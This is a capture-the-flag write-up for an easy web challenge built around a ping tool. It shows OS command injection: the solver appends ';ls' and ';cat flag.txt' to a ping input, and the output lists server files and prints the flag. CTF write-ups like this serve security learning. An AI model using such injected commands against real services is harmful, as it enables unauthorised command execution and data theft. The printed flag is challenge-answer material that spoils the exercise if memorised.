# 05. Daedalus Os

**Author**: fudgesupreme

**Category**: Web

**Difficult**: Easy

## Description

You come across one of Daedalus' side projects. A tool that can ping other websites. But the timing lines up in a way that you cant help but suspect it contains the path forward.
https://daedalus-os.vercel.app

## Solve

- The Website is a ping tool which could be used to ping other websites
- When i do `ping 127.0.0.1`, it works, so i tried to see if I can do command injection by also simultaneously sending another command, like this :
```
ping 127.0.0.1;ls
```
- As we can see that works :
```
theseus@labyrinth:~$ ping 127.0.0.1;ls
[*] Executing remote backend diagnostic sequence...
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.035 ms
api
challenge.yml
flag.txt
pyproject.toml
Readme.md
requirements.txt
templates
uv.lock
___vc
vc__handler__python.py
_vendor
vercel.json
```
- in this i noticed a file called `flag.txt` :
```
theseus@labyrinth:~$ ping 127.0.0.1;cat flag.txt
[*] Executing remote backend diagnostic sequence...
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.035 ms
labyrinth{y0u_5h4ll_p455_7hr0u6h}
```

### Flag :
```
labyrinth{y0u_5h4ll_p455_7hr0u6h}
```
